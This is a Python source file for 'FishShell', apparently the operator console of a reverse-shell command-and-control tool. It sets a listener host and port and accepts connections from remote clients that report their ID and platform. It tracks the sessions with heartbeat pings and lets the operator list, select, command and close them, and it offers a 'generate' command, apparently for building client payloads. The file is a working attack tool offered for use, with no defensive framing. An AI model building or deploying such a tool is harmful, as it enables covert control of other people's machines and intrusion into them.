import os
import sys
import time
import pickle
import platform
import threading
import traceback
import subprocess
import socket as sock
from datetime import datetime


try:
    import rsa
    from tabulate import tabulate
except ModuleNotFoundError:
    print("Installing Dependencies...\n")
    subprocess.call(['pip', 'install', '-r', 'requirements.txt'])
    from tabulate import tabulate
    import rsa
except Exception as err:
    print()
    print(err)
    print()


import sources.functions.var.globals as g
from sources.functions.banner import banner
from sources.functions.help import help_menu
from sources.functions.generate import generate
from sources.functions.session import send_command
from sources.functions.clearScreen import clear_screen


def create_threads():
    global shell_thread, listen_thread, web_thread
    shell_thread = threading.Thread(target=lambda: call_shell())
    listen_thread = threading.Thread(target=lambda: listen())
    listen_thread.daemon = True


def call_shell():
    banner()
    shell()


def listen(again: bool = False):
    accept_thread = threading.Thread(target=accept_connections)
    accept_thread.daemon = True
    if again:
        ping_thread = threading.Thread(target=lambda: start_ping(again))
    else:
        ping_thread = threading.Thread(target=lambda: start_ping())
    ping_thread.daemon = True
    accept_thread.start()
    ping_thread.start()


def start_server():
    try:
        global ping
        g.server = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        ping = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        g.server.bind((g.host, g.port))
        pn_port = g.port+1
        ping.bind((g.host, pn_port))
        g.server.listen()
        ping.listen()
        msg = f"{g.info} Listening on '{g.host}' at port '{g.port}'"
        write_info('server', 'running')
        return True, msg
    except sock.gaierror:
        msg = f"{g.error} Failed to get address info"
    except OSError as error:
        if error.args[0] == 10048:
            msg = f"{g.error} Specified port already in use\n{g.fix}    Use 'set --lport <PORT> to set a different port"
        elif error.args[0] == 10049:
            msg = f"{g.error} Specified host is not valid\n{g.fix}    Use 'set --lhost <HOST> to set a valid host"
        else:
            msg = f"{g.error} {error}"
    except Exception as error:
        msg = f"{g.error} {error}"
    g.server = None
    g.accept = False
    return False, msg


def release_output_buffer():
    global output_buffer
    if output_buffer:
        with lock:
            print([lines for lines in output_buffer][0])
            output_buffer.clear()
            print(f'\n{g.bl}┌[{g.e}FishShell{g.bl}]\n└───↠{g.y}>>> {g.e}', end='')


def accept_connections():
    global output_buffer, run
    while not g.till and g.accept:
        try:
            client, addr = g.server.accept()
            g.server.setblocking(1)
            Id = (client.recv(5120)).decode()
            platform = (client.recv(5120)).decode()
            when = datetime.now()
            g.all_conns[Id] = [client, addr, platform, when, None, 'Active']
            g.active_conns[Id] = [client, addr, platform, when, None]
            write_clients(records=g.active_conns)
            print_msg = f"\n\n{g.info} New Connection!\n{g.info} '{addr[0]}:{addr[1]}' has connected to the server as '{Id}'"
            output_buffer.append(print_msg)
        except Exception as error:
            if not g.till and g.accept:
                print_msg = f"\n\n{g.error} Error While accepting Connections\n[{g.r}Error Code{g.e}] {error}"
                output_buffer.append(print_msg)
        if isShell:
            release_output_buffer()
    return


def start_ping(again: bool = False):
    accept_ping_thread = threading.Thread(target=accept_ping)
    accept_ping_thread.daemon = True
    accept_ping_thread.start()
    if not again:
        send_ping_thread = threading.Thread(target=send_ping)
        send_ping_thread.daemon = True
        send_ping_thread.start()


def accept_ping():
    global ping, run
    while not g.till and g.accept:
        try:
            ping_client, addr = ping.accept()
            ping.setblocking(1)
            Id = (ping_client.recv(5120)).decode()
            g.all_conns[Id][-2] = ping_client
            g.active_conns[Id][-1] = ping_client
        except:
            print(traceback.format_exc())
    return


def send_ping():
    global output_buffer
    while not g.till:
        current_conns = g.active_conns.copy()
        if not current_conns:
            continue
        close = []
        for Id in current_conns:
            if current_conns[Id][-1] is None:
                continue
            try:
                ping_client = g.active_conns[Id][-1]
                ping_client.send(b'ping')
                if ping_client.recv(5120) == b'true':
                    continue
                close.append(Id)
            except:
                close.append(Id)
        for Id in close:
            try:
                print_msg = f"\n\n{g.info} Connection closed!\n{g.info} '{str(g.active_conns[Id][1][0])}:{str(g.active_conns[Id][1][1])}', client id '{Id}' has disconnected from the server"
                output_buffer.append(print_msg)
                del g.active_conns[Id]
                write_clients(records=g.active_conns)
            except:
                pass
        # if isShell:
        #     release_output_buffer()
    return


def list_all_connections():
    results = [['Session ID', 'IP', 'Port', 'Platform', 'Time', 'Status']]
    for Id in g.all_conns:
        it = g.all_conns[Id]
        conn = it[0]
        try:
            conn.send(b'start')
            conn.send(b'is_alive')
            if conn.recv(1024) != b'alive':
                it[5] = 'Closed/Died'
            else:
                g.active_conns[Id] = [it[0], it[1], it[2], it[3], it[4]]
        except:
            it[5] = 'Closed/Died'
        connection = [str(Id), it[1][0], str(it[1][1]), it[2], it[3], it[5]]
        results.append(connection)
    print()
    print("+—————————————————————————————————+")
    print("|  <----------Clients---------->  |")
    print("+—————————————————————————————————+")
    print()
    if len(results) == 1:
        print("+----------------+")
        print("| No connections |")
        print("+----------------+")
    else:
        print(tabulate(results, headers='firstrow', tablefmt='fancy_grid'))
    print()


def list_active_connections():
    results = [['Session ID', 'IP', 'Port', 'Platform', 'Time']]
    for Id in g.all_conns:
        it = g.all_conns[Id]
        conn = it[0]
        try:
            conn.send(b'start')
            conn.send(b'is_alive')
            if conn.recv(1024) != b'alive':
                continue
        except:
            continue
        g.active_conns[Id] = [it[0], it[1], it[2], it[3], it[4]]
        connection = [str(Id), it[1][0], str(it[1][1]), it[2], it[3]]
        results.append(connection)
    print()
    print("+————————————————————————————————————————+")
    print("|  <----------Active_Clients---------->  |")
    print("+————————————————————————————————————————+")
    print()
    if len(results) == 1:
        print("+-----------------------+")
        print("| No Active connections |")
        print("+-----------------------+")
    else:
        print(tabulate(results, headers='firstrow', tablefmt='fancy_grid'))
    print()


def select_client(Id):
    if Id in g.active_conns:
        try:
            client = g.active_conns[Id][0]
            addr = g.active_conns[Id][1]
            print()
            print(f"{g.info} Joined session of [{addr[0]}:{addr[1]}]")
            print()
            client.send(b'start')
            send_command(client=client, Id=Id, ip=addr[0])
        except sock.timeout:
            print()
            print("Session may have died")
            print()
        except Exception as e:
            print()
            print(traceback.format_exc())
            print()
            print(e)
            print()
    elif Id in g.all_conns:
        print()
        print("Session was closed")
        print()
    else:
        print()
        print("Session ID not found")
        print()


def close_connection(Id):
    if Id in g.active_conns:
        try:
            client = g.active_conns[Id][0]
            addr = g.active_conns[Id][1]
            client.send(b'start')
            client.send(b'close')
            client.close()
            del g.active_conns[Id]
            print()
            print(f"Closed connection with [{addr[0]}:{addr[1]}]")
        except sock.timeout:
            print()
            print("Session may have already died")
        except Exception as e:
            print()
            print(e)
    elif Id in g.all_conns:
        print()
        print("Session was already closed")
    else:
        print()
        print("Session ID not found")


def close_all_connections():
    for Id in g.active_conns:
        try:
            client = g.active_conns[Id][0]
            client.send(b'start')
            client.send(b'close')
            client.close()
        except sock.timeout:
            print()
            print(f"Session '{Id}' may have already died")
        except Exception as e:
            print()
            print(e)
    g.active_conns.clear()


def quit_shell():
    for Id in g.active_conns:
        client = g.active_conns[Id][0]
        client.send(b'start')
        client.send(b'quit')
        client.close()
    g.active_conns.clear()


def shell():
    global cmnd, output_buffer, listen_thread, web_thread, isShell
    write_info('server', None)
    write_clients(records={})
    isShell = True
    while not g.till:
        try:
            print()
            cmnd = input(f"{g.bl}┌[{g.e}FishShell{g.bl}]\n└───↠{g.y}>>> {g.e}")
            if cmnd == 'help':
                help_menu(command='help')
            elif '--help' in cmnd or '-h' in cmnd:
                help_menu(command=cmnd)
            elif cmnd == 'clear':
                clear_screen()
            elif cmnd[:3] == 'set':
                if g.server is not None:
                    print()
                    print(f"{g.error} Server already running")
                    print(f"{g.fix}   Restart the program to change 'lhost' or 'lport'")
                    continue
                if '-i' in cmnd or '--lhost' in cmnd:
                    g.host = cmnd.replace('set --lhost ', '').replace('set -i ', '')
                    print()
                    print(f'lhost set to --> {g.host}')
                elif '-p' in cmnd or '--lport' in cmnd:
                    g.port = int(cmnd.replace('set --lport ', '').replace('set -p ', ''))
                    print()
                    print(f'lport set to --> {g.port}')
                else:
                    print()
                    print(f"{g.error} Invalid arguments...")
                    print(f"{g.fix}   Enter set --help to view usage")
            elif cmnd[:8] == 'generate':
                generate(data=cmnd)
            elif cmnd == 'listen':
                if g.server is not None:
                    print(f"\n{g.error} Listener can only be started once")
                    continue
                if g.host == '127.0.0.1' and g.port == 3784:
                    print()
                    print("'lhost' and 'lport' not set, continuing with default parameters")
                state, msg = start_server()
                if state:
                    g.accept = True
                    listen_thread.start()
                    listen_thread = threading.Thread(target=lambda: listen(again=True))
                print()
                print(msg)
            elif cmnd[:4] == 'list':
                if cmnd[5:] == '--active' or cmnd[5:] == '-c':
                    list_active_connections()
                elif cmnd[5:] == '--all' or cmnd[5:] == '-a':
                    list_all_connections()
                else:
                    print()
                    print(f"{g.error} Invalid arguments...")
                    print(f"{g.fix}   Enter list --help to view usage")
            elif cmnd[:6] == 'select':
                if cmnd[7:10] == '-id':
                    Id = cmnd[11:]
                    isShell = False
                    select_client(Id=Id)
                    isShell = True
                else:
                    print()
                    print(f"{g.error} Invalid arguments...")
                    print(f"{g.fix}   Enter select --help to view usage")
            elif cmnd[:5] == 'close':
                if g.server is None:
                    print()
                    print(f"{g.error} No active connections to close")
                    print(f"{g.fix}   Enter 'listen' to start listening for connections")
                    continue
                if cmnd[6:8] == '-id':
                    Id = cmnd[10:]
                    close_connection(Id)
                elif cmnd[6:] == '-all':
                    close_all_connections()
                else:
                    print()
                    print(f"{g.error} Invalid arguments...")
                    print(f"{g.fix}    Enter close --help to view usage")
            elif cmnd.lower() in ['exit', 'quit', 'q', 'x']:
                print()
                print("Enter 'qs' to exit/quit shell")
                print("Enter 'q!' to force quit shell and clients")
            elif cmnd == 'qs':
                g.till, g.accept = True, False
                print()
                if g.server is not None:
                    if len(g.active_conns) != 0:
                        print("Closing connections...")
                        quit_shell()
                    else:
                        print("No active connections...Closed None")
                    print("Quiting Server...\n")
                    g.server.close()
                print("Exit code : o")
                break
            elif cmnd == 'q!':
                g.till, g.accept = True, False
                print()
                if g.server is not None:
                    if len(g.active_conns) != 0:
                        print("Quiting clients...")
                        print("Closing connections...")
                        close_all_connections()
                    else:
                        print("No active connections...Closed None")
                    quit_shell()
                    print("Quiting Server...\n")
                    g.server.close()
                print("Exit code : 1")
                break
            elif cmnd[:len(cmnd)] == (len(cmnd)*' ') or cmnd == '':
                pass
            else:
                help_menu(command=cmnd)
        except KeyboardInterrupt:
            print()
            print("Enter 'qs' to exit/quit shell")
            print("Enter 'q!' to force quit shell and clients")
        except EOFError:
            print()
            print("Enter 'qs' to exit/quit shell")
            print("Enter 'q!' to force quit shell and clients")
        except Exception as error:
            print()
            print(traceback.format_exc())
            print()
            print(error)
            shell()
        if output_buffer:
            print(f'{g.bl}┌[{g.e}FishShell{g.bl}]\n└───↠{g.y}>>> {g.e}', end='')
            print([lines for lines in output_buffer][0])
            output_buffer.clear()
    write_clients(records={})
    write_info('all', None)
    return


def main():
    global lock, output_buffer, isShell
    lock = threading.Lock()
    output_buffer = []
    isShell = False
    g.initialize()
    g.all_conns = {}
    g.active_conns = {}
    g.till, g.accept = False, False
    g.server = None
    g.host, g.port = '127.0.0.1', 3784
    create_threads()
    try:
        shell_thread.start()
        shell_thread.join()
    except KeyboardInterrupt:
        pass
    except Exception:
        print(traceback.format_exc())


if __name__ == '__main__':
    if platform.system() == 'Windows':
        subprocess.run('cls', shell=True)
    else:
        subprocess.run('clear', shell=True)
    main()
    print()
    input("Press enter to continue...")
    sys.exit(0)
